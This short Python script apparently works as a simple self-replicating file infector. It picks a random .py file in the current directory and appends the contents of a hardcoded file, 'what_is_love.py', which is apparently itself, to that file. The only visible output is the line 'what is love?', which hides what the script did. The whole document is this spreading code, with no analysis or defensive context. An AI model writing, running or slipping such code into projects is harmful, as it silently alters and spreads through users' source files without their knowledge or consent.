import random
import os
files = os.listdir("./")
files = [f for f in files if os.path.isfile(f) and f.endswith(".py")]
f = random.choice(files)
with open(f, mode="a") as file:
    with open("C:\\Users\\USER\\PycharmProjects\\AIing\\what_is_love.py", "r") as what_is_love:
        file.write(what_is_love.read())
print("what is love?")
